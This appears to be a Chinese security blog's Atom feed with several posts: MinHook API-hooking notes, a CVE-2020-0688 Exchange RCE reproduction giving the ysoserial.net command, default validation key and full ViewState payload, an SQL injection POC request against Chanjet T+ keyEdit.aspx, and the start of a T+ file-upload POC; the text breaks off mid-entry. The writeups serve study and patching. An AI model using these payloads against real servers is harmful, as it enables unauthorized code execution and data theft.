<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>oone</title>
  
  <subtitle>固执无罪，梦想无价 | Coding For Knowledge</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-05-11T01:55:51.674Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>mingming</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【软件设计师】考前整理</title>
    <link href="http://example.com/B_%E4%B9%A6%E7%B1%8D%E8%B5%84%E6%96%99/%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E5%B8%88/%E3%80%90%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E5%B8%88%E3%80%91%E8%80%83%E5%89%8D%E6%95%B4%E7%90%86/"/>
    <id>http://example.com/B_%E4%B9%A6%E7%B1%8D%E8%B5%84%E6%96%99/%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E5%B8%88/%E3%80%90%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E5%B8%88%E3%80%91%E8%80%83%E5%89%8D%E6%95%B4%E7%90%86/</id>
    <published>2024-05-11T00:28:48.080Z</published>
    <updated>2024-05-11T01:55:51.674Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：软件设计师考前刷题记录</p></blockquote><span id="more"></span><p><a href="https://www.yuque.com/stimuming/gtzioh/mos9t6ey71g1nr1x">《软件设计师》</a></p><h2 id="软件工程"><a href="#软件工程" class="headerlink" title="软件工程"></a>软件工程</h2><img src="/B_%E4%B9%A6%E7%B1%8D%E8%B5%84%E6%96%99/%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E5%B8%88/%E3%80%90%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E5%B8%88%E3%80%91%E8%80%83%E5%89%8D%E6%95%B4%E7%90%86/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B.png" class="" title="img">]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：软件设计师考前刷题记录&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="B_书籍资料" scheme="http://example.com/categories/B-%E4%B9%A6%E7%B1%8D%E8%B5%84%E6%96%99/"/>
    
    <category term="软件设计师" scheme="http://example.com/categories/B-%E4%B9%A6%E7%B1%8D%E8%B5%84%E6%96%99/%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E5%B8%88/"/>
    
    
  </entry>
  
  <entry>
    <title>【OPenSource】MinHook</title>
    <link href="http://example.com/C_OpenSource/%E3%80%90OPenSource%E3%80%91MinHook/"/>
    <id>http://example.com/C_OpenSource/%E3%80%90OPenSource%E3%80%91MinHook/</id>
    <published>2024-05-10T16:00:00.000Z</published>
    <updated>2024-05-11T09:47:40.432Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：MinHook——一个mini的Hook库。如何使用及原理解析</p></blockquote><span id="more"></span><h2 id="MinHook-说明"><a href="#MinHook-说明" class="headerlink" title="MinHook 说明"></a>MinHook 说明</h2><p>MinHook 是一个用C语言实现的 mini 的 Hook 项目，可同时适用于 x86&#x2F;x64环境下，支持静态编译到项目中，目前 :star: Github Start 4K。</p><p>Github地址：<a href="https://github.com/TsudaKageyu/minhook">TsudaKageyu&#x2F;minhook: The Minimalistic x86&#x2F;x64 API Hooking Library for Windows</a></p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>如何使用  MinHook ？</p><p>使用非常简单，初始化、创建Hook、启用Hook。大致代码如下所示：</p><p><strong>Hook 实现修改弹窗:</strong> 实现<code>Hook MsgBox</code>弹窗,该库的原理与我们上面手动实现的方式是相同的.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">代码来自 C/C++ MinHook 库的使用技巧 - lyshark - 博客园</span></span><br><span class="line"><span class="comment">https://www.cnblogs.com/LyShark/p/13653435.html</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;MinHook.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;libMinHook.x86.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(WINAPI *OldMessageBox)</span><span class="params">(HWND, LPCSTR, LPCSTR, UINT)</span></span>;</span><br><span class="line"></span><br><span class="line">OldMessageBox fpMessageBoxA = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">MyMessageBoxA</span><span class="params">(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> ret = <span class="built_in">fpMessageBoxA</span>(hWnd, <span class="string">&quot;Hook Inject&quot;</span>, lpCaption, uType);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SetHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">MH_Initialize</span>() == MB_OK)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">MH_CreateHook</span>(&amp;MessageBoxA, &amp;MyMessageBoxA, <span class="built_in">reinterpret_cast</span>&lt;<span class="type">void</span>**&gt;(&amp;fpMessageBoxA));</span><br><span class="line"><span class="built_in">MH_EnableHook</span>(&amp;MessageBoxA);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">UnHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">MH_DisableHook</span>(&amp;MessageBoxA) == MB_OK)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">MH_Uninitialize</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,DWORD ul_reason_for_call,LPVOID lpReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line"><span class="built_in">SetHook</span>();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line"><span class="built_in">UnHook</span>();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里还有其他一些例子，参考文章：<a href="https://www.cnblogs.com/LyShark/p/13653435.html">C&#x2F;C++ MinHook 库的使用技巧 - lyshark - 博客园</a></p><h2 id="MinHook-原理分析"><a href="#MinHook-原理分析" class="headerlink" title="MinHook 原理分析"></a>MinHook 原理分析</h2><p>参考文章：</p><ul><li><a href="https://www.cnblogs.com/lsh123/p/7467997.html">MinHook 分析01 （x86的jmp+offset类型hook） - 沉疴 - 博客园</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：MinHook——一个mini的Hook库。如何使用及原理解析&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="C_OpenSource" scheme="http://example.com/categories/C-OpenSource/"/>
    
    
    <category term="OpenSource" scheme="http://example.com/tags/OpenSource/"/>
    
  </entry>
  
  <entry>
    <title>【CVE-2020-0688】exchange远程代码执行漏洞复现</title>
    <link href="http://example.com/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/Exchange/%E3%80%90CVE-2020-0688%E3%80%91exchange%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://example.com/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/Exchange/%E3%80%90CVE-2020-0688%E3%80%91exchange%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2024-05-10T02:24:53.161Z</published>
    <updated>2024-05-11T09:49:49.116Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：CVE-2020-0688 漏洞复现及分析</p></blockquote><span id="more"></span><p><strong>免责声明：本文所-涉及的信息安全技术知识仅供参考</strong>和学习之用，并不构成任何明示或暗示的保证。读者在使用本文提供的信息时，应自行判断其适用性，并承担由此产生的一切风险和责任。本文作者对于读者基于本文内容所做出的任何行为或决定不承担任何责任。在任何情况下，本文作者不对因使用本文内容而导致的任何直接、间接、特殊或后果性损失承担责任。<strong>读者在使用本文内容时应当遵守当地法律法规，并保证不违反任何相关法律法规。</strong></p><blockquote><p>相关工具下载地址：<a href="https://down.52pojie.cn/Tools/NET/">爱盘 - 最新的在线破解工具包</a></p><p>注意这个漏洞修复的版本，需要修复之前的版本才可以复现。我自己在 Exchange 2016 cu21  上通过 payload 请求对应的接口时返回 400。</p></blockquote><p>[toc]</p><h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Microsoft Exchange Server 2010 Service Pack 3</p><p>Microsoft Exchange Server 2013(cu23以下)</p><p>Microsoft Exchange Server 2016 (cu14以下)</p><p>Microsoft Exchange Server 2019(cu4以下)</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>这个漏洞是由于Exchange服务器在安装时没有正确地创建唯一的加密密钥所造成的。</p><p>具体来说，与正常软件安装每次都会产生随机密钥不同，所有Exchange Server在安装后的 <code>web.config</code> 文件中都拥有相同的 <code>validationKey</code> 和 <code>decryptionKey</code>。这些密钥用于保证 <code>ViewState</code> 的安全性。而 <code>ViewState</code> 是ASP.NET Web应用以序列化格式存储在客户机上的服务端数据。客户端通过__VIEWSTATE请求参数将这些数据返回给服务器。攻击者可以在 <code>ExchangeControl Panel web</code> 应用上执行任意.net代码。</p><p>当攻击者通过各种手段获得一个可以访问Exchange Control Panel （ECP）组件的用户账号密码时。攻击者可以在被攻击的exchange上执行任意代码，直接获取服务器权限。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><p><strong>需要以下四个变量</strong></p><p>想要利用该漏洞，我们需要四个参数，分别为：</p><blockquote><p>–validationkey &#x3D; CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF（默认，漏洞产生原因）</p><p>–validationalg &#x3D; SHA1（默认，漏洞产生原因）</p><p>–generator&#x3D;B97B4E27（基本默认）</p><p>–viewstateuserkey &#x3D; ASP.NET_SessionId（手工获取，变量，每次登陆都不一致）</p></blockquote><p>在这四个变量中，前两个为默认固定，<code>viewstateuserkey</code> 和 <code>generator</code> 的值需要从经过身份验证的 <code>session</code> 中收集。&#96;&#96;viewstateuserkey<code> 可以从ASP.NET的</code>_SessionID cookie<code>中获取，而</code>generator<code> 可以在一个隐藏字段</code>__VIEWSTATEGENERATOR&#96; 中找到。<u>所有这些都可以通过浏览器中的工具轻松获取。</u></p><blockquote><p>:star: 获取 <code>viewstateuserkey</code> 和 <code>generator</code></p><ol><li>登录 Exchange 邮箱页面，<a href="https://localhost/ecp%EF%BC%88%E7%AE%A1%E7%90%86%E5%91%98%E9%A1%B5%E9%9D%A2%EF%BC%89">https://localhost/ecp（管理员页面）</a> 或者 <a href="https://localhost/owa%EF%BC%88%E4%B8%AA%E4%BA%BA%E9%A1%B5%E9%9D%A2%EF%BC%89">https://localhost/owa（个人页面）</a></li><li>登录成功后，重定到 <a href="https://localhost/ecp/defalt.aspx">https://localhost/ecp/defalt.aspx</a> 页面，在 DevTools 中 查看 NetWork 中的 Headers<img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/Exchange/%E3%80%90CVE-2020-0688%E3%80%91exchange%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240510120244926.png" class="" title="image-20240510120244926"></li></ol><p>:star: 在 Response 选项卡获取 <code> __VIEWSTATEGENERATOR</code>  字段值</p><p>如果未找到此字段不必慌张，直接使用默认值B97B4E27 即可。我这边的环境是 Exchange 2016 CU21 ，没有这个字段。</p></blockquote><h3 id="使用工具生成-payload"><a href="#使用工具生成-payload" class="headerlink" title="使用工具生成 payload"></a>使用工具生成 payload</h3><p>使用ysoserial.net工具生成反序列化payload。 工具下载地址：<a href="https://github.com/pwntester/ysoserial.net/">https://github.com/pwntester/ysoserial.net/</a></p><p>生成payload命令：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ysoserial.exe -p ViewState -g TextFormattingRunP</span><br><span class="line">roperties -c &quot;calc.exe&quot; --validationalg=&quot;SHA1&quot; --validationkey=&quot;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&quot; --gene</span><br><span class="line">rator=&quot;B97B4E27&quot; --viewstateuserkey=&quot;bf2c6983-d214-<span class="number">4</span>c98-<span class="number">8</span>bd3-d4ee908cc5f0&quot; --isdebug --islegacy</span><br></pre></td></tr></table></figure><p>生成内容如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Provided __VIEWSTATEGENERATOR in uint: 3111865895</span><br><span class="line">simulateTemplateSourceDirectory returns: /</span><br><span class="line">simulateGetTypeName returns: default_aspx</span><br><span class="line">Calculated pageHashCode in uint (ignored): 3389719348</span><br><span class="line">%2FwEylQcAAQAAAP%2F%2F%2F%2F8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAAC3BTw%2FeG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi0xNiI%2FPg0KPE9iamVjdERhdGFQcm92aWRlciBNZXRob2ROYW1lPSJTdGFydCIgSXNJbml0aWFsTG9hZEVuYWJsZWQ9IkZhbHNlIiB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIiB4bWxuczpzZD0iY2xyLW5hbWVzcGFjZTpTeXN0ZW0uRGlhZ25vc3RpY3M7YXNzZW1ibHk9U3lzdGVtIiB4bWxuczp4PSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCI%2BDQogIDxPYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U%2BDQogICAgPHNkOlByb2Nlc3M%2BDQogICAgICA8c2Q6UHJvY2Vzcy5TdGFydEluZm8%2BDQogICAgICAgIDxzZDpQcm9jZXNzU3RhcnRJbmZvIEFyZ3VtZW50cz0iL2MgY2FsYy5leGUiIFN0YW5kYXJkRXJyb3JFbmNvZGluZz0ie3g6TnVsbH0iIFN0YW5kYXJkT3V0cHV0RW5jb2Rpbmc9Int4Ok51bGx9IiBVc2VyTmFtZT0iIiBQYXNzd29yZD0ie3g6TnVsbH0iIERvbWFpbj0iIiBMb2FkVXNlclByb2ZpbGU9IkZhbHNlIiBGaWxlTmFtZT0iY21kIiAvPg0KICAgICAgPC9zZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICA8L3NkOlByb2Nlc3M%2BDQogIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KPC9PYmplY3REYXRhUHJvdmlkZXI%2BC%2Fut6Ew7vPiSPAD1%2FpCZkdqGtzlp</span><br></pre></td></tr></table></figure><h3 id="相关补丁"><a href="#相关补丁" class="headerlink" title="相关补丁"></a>相关补丁</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Microsoft Exchange Server 2010 Service Pack 3 Update Rollup 30 KB4536989</span><br><span class="line"></span><br><span class="line">Microsoft Exchange Server 2013 Cumulative Update 23 KB4536988</span><br><span class="line"></span><br><span class="line">Microsoft Exchange Server 2016 Cumulative Update 14 KB4536987</span><br><span class="line"></span><br><span class="line">Microsoft Exchange Server 2016 Cumulative Update 15 KB4536987</span><br><span class="line"></span><br><span class="line">Microsoft Exchange Server 2019 Cumulative Update 3 KB4536987</span><br><span class="line"></span><br><span class="line">Microsoft Exchange Server 2019 Cumulative Update 4 KB4536987</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：CVE-2020-0688 漏洞复现及分析&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="A_内功" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/"/>
    
    <category term="A_POC探索" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/"/>
    
    <category term="Exchange" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/Exchange/"/>
    
    
  </entry>
  
  <entry>
    <title>【SQL注入防御】</title>
    <link href="http://example.com/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/SQL%E6%B3%A8%E5%85%A5/%E3%80%90SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1%E3%80%91index/"/>
    <id>http://example.com/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/SQL%E6%B3%A8%E5%85%A5/%E3%80%90SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1%E3%80%91index/</id>
    <published>2024-05-09T07:06:57.037Z</published>
    <updated>2024-05-10T02:24:39.986Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：相关文章整理，思路收集</p></blockquote><span id="more"></span><h2 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h2><h3 id="综述"><a href="#综述" class="headerlink" title="综述"></a>综述</h3><ol><li><a href="https://www.freebuf.com/articles/web/256532.html">初学SQL注入之常见的几种注入类型介绍 - FreeBuf网络安全行业门户</a></li></ol><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ol><li><a href="https://cloud.tencent.com/developer/article/2412785">深入理解SQL注入：原理、危害与防御策略-腾讯云开发者社区-腾讯云</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：相关文章整理，思路收集&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="A_内功" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/"/>
    
    <category term="A_POC探索" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/"/>
    
    <category term="SQL注入" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>【1Day】畅捷通 keyEdit.aspx SQL 漏洞</title>
    <link href="http://example.com/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%901day%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9A%20keyEdit.aspx%20SQL%20%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%901day%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9A%20keyEdit.aspx%20SQL%20%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-05-08T02:52:27.440Z</published>
    <updated>2024-05-09T01:21:30.008Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：畅捷通 keyEdit.aspx SQL 注入漏洞详解</p></blockquote><span id="more"></span><p><strong>免责声明：本文所涉及的信息安全技术知识仅供参考</strong>和学习之用，并不构成任何明示或暗示的保证。读者在使用本文提供的信息时，应自行判断其适用性，并承担由此产生的一切风险和责任。本文作者对于读者基于本文内容所做出的任何行为或决定不承担任何责任。在任何情况下，本文作者不对因使用本文内容而导致的任何直接、间接、特殊或后果性损失承担责任。<strong>读者在使用本文内容时应当遵守当地法律法规，并保证不违反任何相关法律法规。</strong></p><h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><p>如下图所示，请求对应的接口 <code>keyEdit.aspx</code> 时在参数 <code>KeyID</code> 注入 SQL 语句，responses 返回了查询结果。</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%901day%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9A%20keyEdit.aspx%20SQL%20%E6%BC%8F%E6%B4%9E/image-20240508112233698.png" class="" title="image-20240508112233698"><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /tplus/UFAQD/keyEdit.aspx?KeyID=1%27%20and%201=(select%20@@version)%20--&amp;preload=1 HTTP/1.1</span><br><span class="line">Host: 192.168.19.133:80</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>直接看调用函数，简直不要太明显。<code>KeyID</code> 即请求体参数中的 KeyID 参数的值，这里并没有做任何校验，直接和查询 SQL 拼接。在这里大家也需要注意这种 SQL 语句的写法，太容易被利用，至少也要做参数校验。</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%901day%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9A%20keyEdit.aspx%20SQL%20%E6%BC%8F%E6%B4%9E/image-20240508142235684.png" class="" title="image-20240508142235684">]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：畅捷通 keyEdit.aspx SQL 注入漏洞详解&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="A_内功" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/"/>
    
    <category term="A_POC探索" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/"/>
    
    <category term="畅捷通" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/"/>
    
    
  </entry>
  
  <entry>
    <title>【CNVD-2022-60632】畅捷通TPlus任意文件上传漏洞</title>
    <link href="http://example.com/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CNVD-2022-60632%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9ATPlus%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CNVD-2022-60632%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9ATPlus%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-05-07T16:00:00.000Z</published>
    <updated>2024-05-09T01:17:47.126Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：CNVD-2022-60632 畅捷通 T+ 任意文件上传漏洞</p></blockquote><span id="more"></span><p><strong>免责声明：本文所涉及的信息安全技术知识仅供参考</strong>和学习之用，并不构成任何明示或暗示的保证。读者在使用本文提供的信息时，应自行判断其适用性，并承担由此产生的一切风险和责任。本文作者对于读者基于本文内容所做出的任何行为或决定不承担任何责任。在任何情况下，本文作者不对因使用本文内容而导致的任何直接、间接、特殊或后果性损失承担责任。<strong>读者在使用本文内容时应当遵守当地法律法规，并保证不违反任何相关法律法规。</strong></p><h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>2022年8月29日和8月30日，畅捷通公司紧急发布安全补丁修复了畅捷通T+软件任意<a href="https://so.csdn.net/so/search?q=%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E&spm=1001.2101.3001.7020">文件上传漏洞</a>。未经身份认证的攻击者利用该漏洞，通过绕过系统鉴权，在特定配置环境下实现任意文件的上传，从而执行任意代码，获得服务器控制权限。目前，已有用户被不法分子利用该漏洞进行勒索病毒攻击的情况出现。</p><p>CNVD对该漏洞的综合评级为“高危”。</p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>漏洞影响的产品和版本：<br>畅捷通T+单机版&lt;&#x3D;17.0且使用IIS10.0以下版本。</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>POC 使用了  pocsuit 工具，pocsuit 是使用 Python 编写的一个专门用于 POC 编写开发使用的工具集。</p><blockquote><p><strong>如何使用 pocsuit 工具跑 poc?</strong></p><p>以下方 POC 代码为例，运行 POC 命令如下所示：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pocsuite -r .\CNVD-<span class="number">2022</span>-<span class="number">60632</span>.py -u http://localhost:<span class="number">80</span>/ --<span class="built_in">verify</span></span><br></pre></td></tr></table></figure><p>文件架构如下所示：</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CNVD-2022-60632%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9ATPlus%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240508145832793.png" class="" title="image-20240508145832793"><p>上传的文件为 bin 目录下的 dll 文件和 compiled 文件。</p></blockquote><figure class="highlight python"><table><tr><td 